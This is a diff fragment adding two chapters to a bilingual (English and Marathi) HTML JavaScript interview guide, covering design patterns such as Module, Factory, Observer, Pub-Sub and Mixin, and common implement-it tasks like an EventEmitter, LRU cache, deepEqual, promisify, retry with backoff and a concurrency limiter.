 <tr><td>Growing cache</td><td>Size limit or WeakMap</td></tr></table>
 <div class="box mr">थोडक्यात: reachable = जिवंत, unreachable = GC. Timers आणि listeners साफ करा, global variables टाळा, आणि object-आधारित cache साठी WeakMap वापरा.</div>
 
-<!-- ===== END OF CHAPTER 91 ===== -->
+<!-- ===== END OF CHAPTER 94 ===== -->
+
+
+<div class="chapter">Chapter 95: Design Patterns in JavaScript<small>what a design pattern is · Module pattern · Factory · Observer · Pub-Sub · Observer vs Pub-Sub · Mixin · Singleton (recap) · when to use which</small></div>
+<div class="toc"><b>CHAPTER 95 INDEX</b>
+<ol><li>What is a Design Pattern?</li><li>Module Pattern</li><li>Factory Pattern</li><li>Observer Pattern</li><li>Pub-Sub Pattern</li><li>Mixin Pattern</li><li>Interview Questions (Detailed)</li><li>Quick Revision Summary</li></ol></div>
+<div class="box more"><b>Note:</b> this chapter has no source folder. It was added to fill interview gaps. The Singleton pattern is already covered in Chapter 59.</div>
+
+<h2>1. What is a Design Pattern?</h2>
+<div class="box def"><b>Definition:</b> A <b>design pattern</b> is a proven, reusable solution to a common software design problem. It is not code you copy, but a template for structuring code. Patterns are grouped as <b>creational</b> (how objects are created: Factory, Singleton), <b>structural</b> (how objects are composed: Module, Mixin, Decorator, Proxy) and <b>behavioural</b> (how objects communicate: Observer, Pub-Sub, Strategy).</div>
+<div class="box mr">Design pattern म्हणजे नेहमी येणाऱ्या समस्येवर सिद्ध झालेला, पुन्हा वापरता येणारा उपाय (code ची रचना). Creational (object कसा बनतो), Structural (objects कसे जोडले जातात) आणि Behavioural (objects एकमेकांशी कसे बोलतात) असे तीन गट.</div>
+
+<h2>2. Module Pattern</h2>
+<div class="box def"><b>Definition:</b> The <b>Module pattern</b> uses a closure (usually an IIFE) to keep variables private and return only a public API. It was the standard way to get encapsulation before ES6 modules and private class fields (#).</div>
+<div class="code-title">Example 1: a private counter</div>
+<pre>const Counter = (function () {
+  let count = 0;                         // private: not reachable from outside
+  return {
+    inc: () =&gt; ++count,
+    get: () =&gt; count,
+  };
+})();
+
+Counter.inc();
+Counter.inc();
+console.log(Counter.get());     // → 2
+console.log(Counter.count);     // → undefined   (count is private)</pre>
+<div class="ex"><b>What happens:</b> the IIFE runs once; the returned object's functions close over count (Chapter 13, Chapter 32), so only they can read or change it.
+<br><b>Output:</b> 2, undefined
+<br><span class="adv">✅ Encapsulation, no global pollution.</span>
+<br><span class="dis">⚠ Private members can't be accessed for testing or extended later; today ES modules (Chapter 88) and #private fields do the same job natively.</span></div>
+<div class="box mr">Module pattern मध्ये IIFE आणि closure वापरून variables private ठेवतात आणि फक्त public functions बाहेर देतात. बाहेरून count थेट मिळत नाही.</div>
+
+<h2>3. Factory Pattern</h2>
+<div class="box def"><b>Definition:</b> The <b>Factory pattern</b> is a function (or method) that creates and returns objects, deciding WHICH kind of object to build based on its input, so the caller doesn't need to know the classes or use <code>new</code>.</div>
+<div class="code-title">Example 2: a shape factory</div>
+<pre>function createShape(type, size) {
+  const shapes = {
+    circle: () =&gt; ({ type, area: +(Math.PI * size ** 2).toFixed(2) }),
+    square: () =&gt; ({ type, area: size * size }),
+  };
+  if (!shapes[type]) throw new Error(`Unknown shape: ${type}`);
+  return shapes[type]();
+}
+
+console.log(createShape("circle", 1));   // → { type: 'circle', area: 3.14 }
+console.log(createShape("square", 3));   // → { type: 'square', area: 9 }
+createShape("hexagon", 1);               // → Error: Unknown shape: hexagon</pre>
+<div class="ex"><b>What happens:</b> the factory looks up a creator function by type and calls it; the caller only knows the factory.
+<br><b>Output:</b> verified in Node, as in the comments.
+<br><span class="adv">✅ Real uses: document.createElement(tag), creating different API clients/loggers per environment, React.createElement.</span>
+<br><span class="dis">⚠ Factory functions returning plain objects don't share methods through a prototype (each object gets its own copies), which uses more memory for many objects.</span></div>
+<div class="box mr">Factory म्हणजे object बनवणारे function: input नुसार कोणता object बनवायचा ते ठरवते. वापरणाऱ्याला class किंवा new माहीत असण्याची गरज नाही. उदा. document.createElement.</div>
+
+<h2>4. Observer Pattern</h2>
+<div class="box def"><b>Definition:</b> In the <b>Observer pattern</b>, an object called the <b>subject</b> keeps a list of <b>observers</b> and notifies them directly when its state changes. Observers subscribe to the subject itself, so they know about it (tight coupling).</div>
+<div class="code-title">Example 3: subject and observers</div>
+<pre>class Subject {
+  constructor() { this.observers = new Set(); }
+  subscribe(o)   { this.observers.add(o); }
+  unsubscribe(o) { this.observers.delete(o); }
+  notify(data)   { this.observers.forEach(o =&gt; o.update(data)); }
+}
+
+const stock = new Subject();
+const chart = { update: d =&gt; console.log("chart got", d) };
+const table = { update: d =&gt; console.log("table got", d) };
+
+stock.subscribe(chart);
+stock.subscribe(table);
+stock.notify(10);          // → chart got 10
+                           // → table got 10
+stock.unsubscribe(chart);
+stock.notify(20);          // → table got 20</pre>
+<div class="ex"><b>What happens:</b> notify loops over the current observers and calls update on each one. A Set prevents subscribing the same observer twice.
+<br><b>Output:</b> verified in Node.
+<br><span class="adv">✅ Real uses: addEventListener (the element is the subject), MutationObserver/IntersectionObserver, state stores, RxJS.</span>
+<br><span class="dis">⚠ Forgetting to unsubscribe keeps observers alive → memory leaks (Chapter 94).</span></div>
+
+<h2>5. Pub-Sub Pattern</h2>
+<div class="box def"><b>Definition:</b> In <b>Publish-Subscribe</b>, publishers and subscribers never know each other. They communicate through a middle <b>event channel (broker)</b>: publishers send messages to a topic name, and everyone subscribed to that topic receives them (loose coupling).</div>
+<div class="code-title">Example 4: a tiny pub-sub broker</div>
+<pre>const PubSub = (() =&gt; {
+  const topics = {};
+  return {
+    subscribe(topic, fn) {
+      (topics[topic] ||= []).push(fn);
+      return { unsubscribe: () =&gt; (topics[topic] = topics[topic].filter(f =&gt; f !== fn)) };
+    },
+    publish(topic, data) {
+      (topics[topic] || []).forEach(fn =&gt; fn(data));
+    },
+  };
+})();
+
+const sub = PubSub.subscribe("order", d =&gt; console.log("email for", d.id));
+PubSub.publish("order", { id: 7 });   // → email for 7
+sub.unsubscribe();
+PubSub.publish("order", { id: 8 });   // → (nothing)</pre>
+<div class="ex"><b>What happens:</b> the broker stores callbacks per topic; publish calls every callback for that topic. The order module and the email module never import each other.
+<br><b>Output:</b> verified in Node.
+<br><span class="adv">✅ Real uses: message queues (Kafka, Redis pub/sub), Node's EventEmitter, cross-component events in micro-frontends.</span>
+<br><span class="dis">⚠ Harder to debug (who published this?), and a typo in a topic name fails silently.</span></div>
+<div class="fig"><svg viewBox="0 0 660 150" width="620"><g font-family="sans-serif" font-size="12">
+<text x="160" y="16" text-anchor="middle" font-weight="bold">Observer</text>
+<rect x="100" y="25" width="120" height="36" rx="6" fill="#eef4ff" stroke="#2c5aa0"/><text x="160" y="48" text-anchor="middle">Subject</text>
+<rect x="30" y="105" width="110" height="32" rx="6" fill="#eafaf1" stroke="#27ae60"/><text x="85" y="126" text-anchor="middle">Observer A</text>
+<rect x="180" y="105" width="110" height="32" rx="6" fill="#eafaf1" stroke="#27ae60"/><text x="235" y="126" text-anchor="middle">Observer B</text>
+<line x1="140" y1="61" x2="90" y2="105" stroke="#2c5aa0" stroke-width="2"/><line x1="180" y1="61" x2="230" y2="105" stroke="#2c5aa0" stroke-width="2"/>
+<text x="490" y="16" text-anchor="middle" font-weight="bold">Pub-Sub</text>
+<rect x="360" y="60" width="90" height="36" rx="6" fill="#eef4ff" stroke="#2c5aa0"/><text x="405" y="83" text-anchor="middle">Publisher</text>
+<rect x="470" y="55" width="80" height="46" rx="6" fill="#fff7e6" stroke="#f0a020"/><text x="510" y="75" text-anchor="middle">Broker</text><text x="510" y="91" text-anchor="middle" font-size="10">topics</text>
+<rect x="570" y="30" width="80" height="30" rx="6" fill="#eafaf1" stroke="#27ae60"/><text x="610" y="50" text-anchor="middle">Sub 1</text>
+<rect x="570" y="95" width="80" height="30" rx="6" fill="#eafaf1" stroke="#27ae60"/><text x="610" y="115" text-anchor="middle">Sub 2</text>
+<line x1="450" y1="78" x2="470" y2="78" stroke="#555" stroke-width="2"/><line x1="550" y1="70" x2="570" y2="45" stroke="#555" stroke-width="2"/><line x1="550" y1="88" x2="570" y2="110" stroke="#555" stroke-width="2"/>
+<text x="490" y="145" text-anchor="middle" font-size="11">publisher and subscribers don't know each other</text></g></svg>
+<div class="cap">Figure 163: Observer (direct link) vs Pub-Sub (through a broker).</div></div>
+<table><tr><th></th><th>Observer</th><th>Pub-Sub</th></tr>
+<tr><td>Who knows whom</td><td>Observers know the subject</td><td>Nobody knows anybody; only topic names</td></tr>
+<tr><td>Middleman</td><td>None</td><td>Broker / event bus</td></tr>
+<tr><td>Coupling</td><td>Tighter</td><td>Loose</td></tr>
+<tr><td>Example</td><td>addEventListener</td><td>Message queue, event bus</td></tr></table>
+<div class="box mr">Observer मध्ये subject स्वतःच्या observers ना थेट कळवतो. Pub-Sub मध्ये publisher आणि subscriber एकमेकांना ओळखत नाहीत; मधला broker topic नुसार messages पोहोचवतो. Unsubscribe करायला विसरू नका, नाहीतर memory leak.</div>
+
+<h2>6. Mixin Pattern</h2>
+<div class="box def"><b>Definition:</b> A <b>mixin</b> is an object of methods that is copied into a class's prototype (usually with <code>Object.assign</code>) to share behaviour between classes WITHOUT inheritance. JavaScript classes can extend only one parent; mixins add extra abilities.</div>
+<div class="code-title">Example 5: canFly + canSwim</div>
+<pre>const canFly  = { fly()  { return `${this.name} flies`; } };
+const canSwim = { swim() { return `${this.name} swims`; } };
+
+class Duck { constructor(name) { this.name = name; } }
+Object.assign(Duck.prototype, canFly, canSwim);
+
+console.log(new Duck("Donald").fly());   // → Donald flies
+console.log(new Duck("D").swim());       // → D swims</pre>
+<div class="ex"><b>What happens:</b> the methods are copied onto Duck.prototype, so every Duck instance gets them through the prototype chain (Chapter 56), and this is the instance.
+<br><b>Output:</b> verified in Node.
+<br><span class="adv">✅ "Composition over inheritance": combine small abilities instead of deep class trees.</span>
+<br><span class="dis">⚠ Name clashes: a later mixin silently overwrites a method with the same name.</span></div>
+<div class="box mr">Mixin म्हणजे methods चा object जो Object.assign ने class च्या prototype मध्ये copy केला जातो. Class एकाच parent ला extend करू शकतो, पण mixins ने अनेक क्षमता जोडता येतात.</div>
+
+<h2>7. Interview Questions (Detailed)</h2>
+<div class="q">Q1. Observer vs Pub-Sub?</div>
+<p>Observer: subject holds references to observers and calls them directly. Pub-Sub: a broker decouples publishers and subscribers using topics; they never reference each other.</p>
+<div class="q">Q2. How would you implement private variables in JavaScript?</div>
+<p>Closures (Module pattern / factory functions), ES module scope (not exported), #private class fields, or a WeakMap keyed by the instance.</p>
+<div class="q">Q3. Factory function vs class?</div>
+<p>Factories need no new, can return different types, and give true privacy via closures; classes share methods on the prototype (less memory) and support instanceof and extends.</p>
+<div class="q">Q4. Which design patterns does the browser itself use?</div>
+<p>Observer (addEventListener, observers APIs), Factory (createElement), Singleton (window, document), Proxy (the Proxy object, Service Workers), Iterator (for...of).</p>
+<div class="q">Q5. What is "composition over inheritance"?</div>
+<p>Build objects by combining small independent behaviours (mixins, functions) rather than long inheritance chains, which are rigid and hard to change.</p>
+<div class="q">Q6. Output-based questions</div>
+<pre>const s = new Subject();
+const o = { update: d =&gt; console.log("got", d) };
+s.subscribe(o); s.subscribe(o);
+s.notify(1);
+// → got 1          (Set ignores the duplicate; with an array it would print twice)
+
+const Mod = (() =&gt; { let x = 1; return { x, inc: () =&gt; ++x }; })();
+Mod.inc();
+console.log(Mod.x);
+// → 1              (Mod.x is a COPY of x taken at return time; inc changes the closure variable)</pre>
+<div class="ex"><ul class="pl"><li><b>What happens:</b> a Set stores each observer once; returning x puts its value (a primitive) into the object, so later changes to the private x are not seen.</li><li><b>Output:</b> got 1 / 1</li><li><span class="dis">⚠ Expose a getter (get: () =&gt; x) instead of the value.</span></li></ul></div>
+
+<h2>8. Quick Revision Summary</h2>
+<table><tr><th>Pattern</th><th>Type</th><th>Idea</th></tr>
+<tr><td>Module</td><td>Structural</td><td>IIFE + closure → private state</td></tr>
+<tr><td>Factory</td><td>Creational</td><td>Function decides which object to create</td></tr>
+<tr><td>Singleton</td><td>Creational</td><td>Only one instance (Chapter 59)</td></tr>
+<tr><td>Observer</td><td>Behavioural</td><td>Subject notifies its observers</td></tr>
+<tr><td>Pub-Sub</td><td>Behavioural</td><td>Broker + topics, loose coupling</td></tr>
+<tr><td>Mixin</td><td>Structural</td><td>Copy methods into a prototype</td></tr></table>
+<div class="box mr">थोडक्यात: Module = private data, Factory = object बनवणारे function, Observer = subject थेट कळवतो, Pub-Sub = broker मधून topic नुसार, Mixin = methods copy करून share करणे.</div>
+
+<!-- ===== END OF CHAPTER 95 ===== -->
+
+<div class="chapter">Chapter 96: Machine Coding: Implement-It Questions<small>EventEmitter · LRU Cache · deepEqual · promisify · retry with backoff · concurrency limit · compose &amp; pipe · flattenObject · get(obj, path)</small></div>
+<div class="toc"><b>CHAPTER 96 INDEX</b>
+<ol><li>EventEmitter (on, off, once, emit)</li><li>LRU Cache</li><li>deepEqual</li><li>promisify</li><li>retry with Exponential Backoff</li><li>Promise Concurrency Limit</li><li>compose &amp; pipe</li><li>flattenObject</li><li>get(obj, path, default)</li><li>Interview Questions (Detailed)</li><li>Quick Revision Summary</li></ol></div>
+<div class="box more"><b>Note:</b> this chapter has no source folder. It collects the most common "write this function" interview tasks that were missing from the notes. Debounce/throttle (Chapters 79, 80), polyfills (Chapters 86–88), deep clone (Chapter 90) and memoize (Chapter 35) are already covered. <b>Every output below was verified by running the code in Node.</b></div>
+
+<h2>1. EventEmitter (on, off, once, emit)</h2>
+<div class="box def"><b>Definition:</b> An <b>EventEmitter</b> stores listener functions per event name. <code>on</code> adds a listener, <code>off</code> removes it, <code>once</code> adds a listener that removes itself after the first call, and <code>emit</code> calls all listeners of an event with the given arguments. Node's <code>events</code> module and the browser's EventTarget work this way.</div>
+<div class="code-title">Example 1: implementation</div>
+<pre>class EventEmitter {
+  constructor() { this.events = {}; }
+
+  on(name, fn) {
+    (this.events[name] ||= []).push(fn);
+    return () =&gt; this.off(name, fn);              // handy "unsubscribe" function
+  }
+
+  off(name, fn) {
+    this.events[name] = (this.events[name] || [])
+      .filter(f =&gt; f !== fn &amp;&amp; f.original !== fn); // also removes once-wrappers
+  }
+
+  once(name, fn) {
+    const wrapper = (...args) =&gt; { this.off(name, wrapper); fn(...args); };
+    wrapper.original = fn;                         // so off(name, fn) still works
+    this.on(name, wrapper);
+  }
+
+  emit(name, ...args) {
+    const list = this.events[name];
+    if (!list || !list.length) return false;
+    [...list].forEach(f =&gt; f(...args));            // copy: listeners may remove themselves
+    return true;
+  }
+}</pre>
+<div class="code-title">Example 2: usage</div>
+<pre>const e = new EventEmitter();
+const hi = n =&gt; console.log("hi", n);
+e.on("greet", hi);
+e.once("greet", n =&gt; console.log("once", n));
+
+console.log(e.emit("greet", "A"));   // → hi A
+                                     // → once A
+                                     // → true
+e.emit("greet", "B");                // → hi B          (once-listener is gone)
+e.off("greet", hi);
+console.log(e.emit("greet", "C"));   // → false         (no listeners left)</pre>
+<div class="ex"><b>What happens:</b> emit loops over a COPY of the listener array; the once-wrapper removes itself during the loop without breaking the iteration.
+<br><b>Output:</b> hi A, once A, true, hi B, false
+<br><span class="dis">⚠ Common bugs interviewers check: iterating the live array while once removes items (skips a listener), and off(name, fn) not working for once listeners (fixed by wrapper.original).</span></div>
+<div class="box mr">EventEmitter मध्ये event नावानुसार functions ची list ठेवतात. on = जोडणे, off = काढणे, once = एकदाच चालून स्वतः निघणे, emit = सर्व listeners चालवणे. emit करताना list ची copy वापरा.</div>
+
+<h2>2. LRU Cache</h2>
+<div class="box def"><b>Definition:</b> An <b>LRU (Least Recently Used) cache</b> holds at most <code>capacity</code> items. Reading or writing a key makes it "most recent"; when the cache is full, the <b>least recently used</b> key is removed. Both get and put must be O(1).</div>
+<div class="code-title">Example 3: LRU with a Map (insertion order = usage order)</div>
+<pre>class LRUCache {
+  constructor(capacity) { this.capacity = capacity; this.map = new Map(); }
+
+  get(key) {
+    if (!this.map.has(key)) return -1;
+    const value = this.map.get(key);
+    this.map.delete(key);          // move the key to the END (= most recent)
+    this.map.set(key, value);
+    return value;
+  }
+
+  put(key, value) {
+    if (this.map.has(key)) this.map.delete(key);
+    this.map.set(key, value);
+    if (this.map.size &gt; this.capacity)
+      this.map.delete(this.map.keys().next().value);   // first key = least recent
+  }
+}
+
+const c = new LRUCache(2);
+c.put("a", 1); c.put("b", 2);
+console.log(c.get("a"));          // → 1      (a is now most recent: order b, a)
+c.put("c", 3);                    //          (full → evict b)
+console.log(c.get("b"));          // → -1
+console.log(c.get("c"));          // → 3
+console.log([...c.map.keys()]);   // → [ 'a', 'c' ]</pre>
+<div class="ex"><b>What happens:</b> a Map remembers insertion order (Chapter 54). Deleting and re-inserting a key moves it to the end, so the FIRST key is always the least recently used one.
+<br><b>Output:</b> 1, -1, 3, [ 'a', 'c' ]
+<br><span class="adv">✅ All operations O(1). In other languages (or if asked "without Map"), use a hash map + doubly linked list.</span></div>
+<div class="fig"><svg viewBox="0 0 640 110" width="600"><g font-family="sans-serif" font-size="12">
+<text x="10" y="20" font-weight="bold">Map order:</text>
+<rect x="100" y="35" width="70" height="34" rx="6" fill="#fdecea" stroke="#c0392b"/><text x="135" y="57" text-anchor="middle">b</text>
+<rect x="190" y="35" width="70" height="34" rx="6" fill="#eef4ff" stroke="#2c5aa0"/><text x="225" y="57" text-anchor="middle">a</text>
+<rect x="280" y="35" width="70" height="34" rx="6" fill="#eafaf1" stroke="#27ae60"/><text x="315" y="57" text-anchor="middle">c (new)</text>
+<text x="135" y="90" text-anchor="middle" fill="#c0392b" font-size="11">least recent → evicted</text><text x="315" y="90" text-anchor="middle" fill="#27ae60" font-size="11">most recent</text>
+<text x="380" y="57" font-size="11">get / put = delete + set → move to the end</text></g></svg>
+<div class="cap">Figure 164: In a Map-based LRU, the first key is always the one to evict.</div></div>
+<div class="box mr">LRU cache मध्ये जास्तीत जास्त capacity इतक्या keys राहतात. वापरलेली key शेवटी हलवतात; cache भरल्यावर पहिली (सर्वात जुनी वापरलेली) key काढतात. Map insertion order लक्षात ठेवतो म्हणून सोपे.</div>
+
+<h2>3. deepEqual</h2>
+<div class="box def"><b>Definition:</b> <code>deepEqual(a, b)</code> returns true when two values have the same structure and the same primitive values at every level, even if they are different objects in memory (=== compares references for objects).</div>
+<div class="code-title">Example 4: recursive comparison</div>
+<pre>function deepEqual(a, b) {
+  if (Object.is(a, b)) return true;                          // same primitive / same reference / NaN
+  if (typeof a !== "object" || typeof b !== "object" || a === null || b === null) return false;
+  if (Array.isArray(a) !== Array.isArray(b)) return false;   // [1] vs { 0: 1 }
+  const ka = Object.keys(a), kb = Object.keys(b);
+  if (ka.length !== kb.length) return false;
+  return ka.every(k =&gt; Object.prototype.hasOwnProperty.call(b, k) &amp;&amp; deepEqual(a[k], b[k]));
+}
+
+console.log(deepEqual({ x: [1, { y: 2 }] }, { x: [1, { y: 2 }] }));  // → true
+console.log(deepEqual({ a: 1 }, { a: "1" }));                       // → false
+console.log(deepEqual(NaN, NaN));                                   // → true  (Object.is)
+console.log(deepEqual([1], { 0: 1 }));                              // → false</pre>
+<div class="ex"><b>What happens:</b> primitives are compared with Object.is; objects/arrays are compared key by key, recursively.
+<br><b>Output:</b> true, false, true, false
+<br><span class="dis">⚠ Follow-ups: Dates (compare getTime()), Maps/Sets, circular references (keep a WeakMap of visited pairs). JSON.stringify comparison fails when key order differs.</span></div>
+<div class="box mr">deepEqual दोन objects ची रचना आणि प्रत्येक level वरील values सारख्या आहेत का ते recursion ने तपासते. === फक्त reference तपासतो, म्हणून वेगळे objects false येतात.</div>
+
+<h2>4. promisify</h2>
+<div class="box def"><b>Definition:</b> <code>promisify(fn)</code> converts a function that uses a Node-style callback <code>(err, data) =&gt; {}</code> as its LAST argument into a function that returns a Promise (Node has util.promisify).</div>
+<div class="code-title">Example 5: implementation and usage</div>
+<pre>function promisify(fn) {
+  return (...args) =&gt; new Promise((resolve, reject) =&gt;
+    fn(...args, (err, data) =&gt; (err ? reject(err) : resolve(data))));
+}
+
+// an old callback-style API
+const oldAdd = (a, b, cb) =&gt;
+  setTimeout(() =&gt; (a &lt; 0 ? cb(new Error("negative")) : cb(null, a + b)), 10);
+
+const add = promisify(oldAdd);
+add(2, 3).then(v =&gt; console.log("promisify", v));                // → promisify 5
+add(-1, 3).catch(e =&gt; console.log("promisify err", e.message));  // → promisify err negative</pre>
+<div class="ex"><b>What happens:</b> the returned function passes the user's arguments plus our own callback; the callback resolves or rejects the promise.
+<br><span class="dis">⚠ If the original function uses this (a method), call it with fn.call(this, ...args, cb) and return a normal function, not an arrow.</span></div>
+<div class="box mr">promisify callback वापरणाऱ्या function ला Promise देणाऱ्या function मध्ये बदलते: err आल्यास reject, नाहीतर resolve. नंतर async/await वापरता येते.</div>
+
+<h2>5. retry with Exponential Backoff</h2>
+<div class="box def"><b>Definition:</b> <code>retry(fn, retries, delay)</code> calls an async function; if it rejects, it waits and tries again, up to <code>retries</code> more times, doubling the delay each time (<b>exponential backoff</b>). If all attempts fail, it rejects with the last error.</div>
+<div class="code-title">Example 6: implementation</div>
+<pre>function retry(fn, retries = 3, delay = 10) {
+  return fn().catch(err =&gt;
+    retries &lt;= 0
+      ? Promise.reject(err)
+      : new Promise(r =&gt; setTimeout(r, delay))
+          .then(() =&gt; retry(fn, retries - 1, delay * 2)));
+}
+
+let tries = 0;
+retry(() =&gt; ++tries &lt; 3 ? Promise.reject(new Error("fail " + tries))
+                         : Promise.resolve("ok after " + tries))
+  .then(console.log);                                // → ok after 3
+
+let t2 = 0;
+retry(() =&gt; Promise.reject(new Error("always " + ++t2)), 2)
+  .catch(e =&gt; console.log("gave up:", e.message));   // → gave up: always 3  (1 try + 2 retries)</pre>
+<div class="ex"><b>What happens:</b> each failure schedules one more attempt after delay ms (10, 20, 40…). With retries = 2 the function runs 3 times in total.
+<br><span class="adv">✅ Add random "jitter" to the delay in real apps, and retry only errors that can succeed later (network, 503), not 400/401.</span></div>
+<div class="box mr">retry अपयशी झालेले async काम थोडा वेळ थांबून पुन्हा करते; प्रत्येक वेळी delay दुप्पट (exponential backoff). सर्व प्रयत्न फसल्यास शेवटची error देते.</div>
+
+<h2>6. Promise Concurrency Limit</h2>
+<div class="box def"><b>Definition:</b> Run a list of async tasks (functions that return promises) with at most <code>limit</code> running at the same time, and return all results in the original order. Promise.all would start ALL of them at once.</div>
+<div class="code-title">Example 7: worker-pool implementation</div>
+<pre>async function runWithLimit(tasks, limit) {
+  const results = [];
+  let i = 0;
+  async function worker() {
+    while (i &lt; tasks.length) {
+      const idx = i++;                         // claim the next task (sync, so no race)
+      results[idx] = await tasks[idx]();
+    }
+  }
+  await Promise.all(Array.from({ length: Math.min(limit, tasks.length) }, worker));
+  return results;
+}
+
+const sleep = (v, ms) =&gt; () =&gt; new Promise(r =&gt; setTimeout(() =&gt; r(v), ms));
+runWithLimit([sleep(1, 30), sleep(2, 10), sleep(3, 20), sleep(4, 5), sleep(5, 5)], 2)
+  .then(r =&gt; console.log(r));   // → [ 1, 2, 3, 4, 5 ]   (never more than 2 running at once)</pre>
+<div class="ex"><b>What happens:</b> limit "workers" run in parallel; each takes the next index, awaits it, then takes another, until none are left. Results are stored by index, so the order is kept even though tasks finish in a different order.
+<br><b>Output:</b> [ 1, 2, 3, 4, 5 ] (verified, with max 2 running at a time).
+<br><span class="dis">⚠ If one task rejects, this version rejects as a whole (like Promise.all); use try/catch inside worker to collect errors instead (like allSettled).</span></div>
+<div class="box mr">Concurrency limit: एकावेळी जास्तीत जास्त limit इतकीच async कामे चालवायची. limit इतके workers बनवतो; प्रत्येक worker पुढचे काम घेतो. results index नुसार ठेवल्याने order तसाच राहतो.</div>
+
+<h2>7. compose &amp; pipe</h2>
+<div class="box def"><b>Definition:</b> <code>compose(f, g, h)(x)</code> = <code>f(g(h(x)))</code>: functions run <b>right to left</b>. <code>pipe(f, g, h)(x)</code> = <code>h(g(f(x)))</code>: functions run <b>left to right</b>. Both build one function out of many small ones.</div>
+<div class="code-title">Example 8: with reduce / reduceRight</div>
+<pre>const compose = (...fns) =&gt; x =&gt; fns.reduceRight((v, f) =&gt; f(v), x);
+const pipe    = (...fns) =&gt; x =&gt; fns.reduce((v, f) =&gt; f(v), x);
+
+const inc = x =&gt; x + 1, dbl = x =&gt; x * 2;
+console.log(compose(inc, dbl)(5));   // → 11   inc(dbl(5)) = 10 + 1
+console.log(pipe(inc, dbl)(5));      // → 12   dbl(inc(5)) = 6 * 2</pre>
+<div class="ex"><b>What happens:</b> reduce passes the result of each function to the next one (Chapter 45).
+<br><span class="adv">✅ Used in Redux (compose middlewares), functional libraries (lodash/fp, Ramda).</span></div>
+<div class="box mr">compose उजवीकडून डावीकडे functions चालवते, pipe डावीकडून उजवीकडे. एकाचे output पुढच्याचे input.</div>
+
+<h2>8. flattenObject</h2>
+<div class="code-title">Example 9: nested object → dot keys</div>
+<pre>function flattenObject(obj, prefix = "", out = {}) {
+  for (const [k, v] of Object.entries(obj)) {
+    const key = prefix ? `${prefix}.${k}` : k;
+    if (v &amp;&amp; typeof v === "object" &amp;&amp; !Array.isArray(v)) flattenObject(v, key, out);
+    else out[key] = v;
+  }
+  return out;
+}
+console.log(flattenObject({ a: 1, b: { c: 2, d: { e: 3 } }, f: [1, 2] }));
+// → { a: 1, 'b.c': 2, 'b.d.e': 3, f: [ 1, 2 ] }</pre>
+<div class="ex"><b>What happens:</b> plain objects are walked recursively, building the key path; everything else (including arrays and null) is copied as a value.
+<br><span class="dis">⚠ Ask the interviewer whether arrays should be flattened too ('f.0': 1) and how to handle empty objects.</span></div>
+<div class="box mr">flattenObject nested object ला 'b.d.e' सारख्या dot keys असलेल्या एकाच level च्या object मध्ये बदलतो. recursion ने path बनवतो.</div>
+
+<h2>9. get(obj, path, default)</h2>
+<div class="code-title">Example 10: lodash-style safe getter</div>
+<pre>function get(obj, path, defaultValue) {
+  const keys = Array.isArray(path) ? path : path.replace(/\[(\w+)\]/g, ".$1").split(".");
+  let cur = obj;
+  for (const k of keys) {
+    if (cur == null) return defaultValue;      // null or undefined → stop
+    cur = cur[k];
+  }
+  return cur === undefined ? defaultValue : cur;
+}
+
+const user = { a: { b: [{ c: 42 }] } };
+console.log(get(user, "a.b[0].c"));            // → 42
+console.log(get(user, "a.x.y", "N/A"));        // → N/A
+console.log(get(user, ["a", "b", 0, "c"]));    // → 42</pre>
+<div class="ex"><b>What happens:</b> "a.b[0].c" becomes ["a", "b", "0", "c"]; the loop walks the keys and stops early if a level is null/undefined.
+<br><span class="adv">✅ With a fixed path in your own code, optional chaining does the same: user?.a?.b?.[0]?.c ?? "N/A" (Chapter 18, Chapter 17).</span></div>
+<div class="box mr">get(obj, path) string path वापरून nested value सुरक्षितपणे काढते; मधे undefined/null आले तर default value देते.</div>
+
+<h2>10. Interview Questions (Detailed)</h2>
+<div class="q">Q1. Why use a Map for an LRU cache instead of an object?</div>
+<p>A Map keeps insertion order for all key types, has size, and delete + set moves a key to the end in O(1). Objects order integer-like keys first, so the order is not reliable.</p>
+<div class="q">Q2. Why does emit iterate over a copy of the listeners?</div>
+<p>A once-listener removes itself while emit is looping; mutating the array during forEach would skip the next listener.</p>
+<div class="q">Q3. Why not compare objects with JSON.stringify?</div>
+<p>Key order matters to it ({a,b} vs {b,a} differ), it drops undefined/functions, turns NaN into null, and fails on circular references.</p>
+<div class="q">Q4. Promise.all vs a concurrency limit?</div>
+<p>Promise.all only WAITS for promises that are already running; it can't limit them. To limit, you must control when each task function is CALLED (worker pool).</p>
+<div class="q">Q5. What is exponential backoff and why add jitter?</div>
+<p>Waiting longer after each failure (1s, 2s, 4s…) to give the server time to recover. Jitter (random extra delay) prevents many clients from retrying at exactly the same moment.</p>
+<div class="q">Q6. Output-based questions</div>
+<pre>const e2 = new EventEmitter();
+e2.once("x", () =&gt; console.log("A"));
+e2.on("x", () =&gt; console.log("B"));
+e2.emit("x"); e2.emit("x");
+// → A B B      (once runs only the first time)
+
+const lru = new LRUCache(1);
+lru.put(1, "one"); lru.put(2, "two");
+console.log(lru.get(1), lru.get(2));
+// → -1 two     (capacity 1: key 1 evicted)
+
+console.log(compose()(7), pipe()(7));
+// → 7 7        (no functions: reduce returns the initial value)</pre>
+<div class="ex"><ul class="pl"><li><b>What happens:</b> once removes itself; capacity 1 keeps only the last key; empty compose/pipe return x unchanged.</li><li><b>Output:</b> as in the comments.</li></ul></div>
+
+<h2>11. Quick Revision Summary</h2>
+<table><tr><th>Task</th><th>Key idea</th></tr>
+<tr><td>EventEmitter</td><td>{ name: [fns] }; copy before emit; once-wrapper.original</td></tr>
+<tr><td>LRU Cache</td><td>Map: delete + set to refresh; evict keys().next()</td></tr>
+<tr><td>deepEqual</td><td>Object.is, then recursive key compare, arrays vs objects</td></tr>
+<tr><td>promisify</td><td>Add our own (err, data) callback</td></tr>
+<tr><td>retry</td><td>catch → wait → retry with delay * 2</td></tr>
+<tr><td>Concurrency limit</td><td>limit workers, shared index, results[idx]</td></tr>
+<tr><td>compose / pipe</td><td>reduceRight / reduce</td></tr>
+<tr><td>flattenObject / get</td><td>Recursion with a path / split the path and walk</td></tr></table>
+<div class="box mr">थोडक्यात: machine coding मध्ये आधी requirements विचारा (edge cases), मग सोपे version लिहा, आणि नंतर edge cases (once, circular, errors) handle करा. हे सर्व functions Node मध्ये चालवून तपासले आहेत.</div>
+
+<!-- ===== END OF CHAPTER 96 ===== -->
 
 <!-- PART-END 10: Modern JS &amp; More (add new chapters of this part above this line) -->
 
 <!-- ===================== PART 11: Mock Interviews ===================== -->
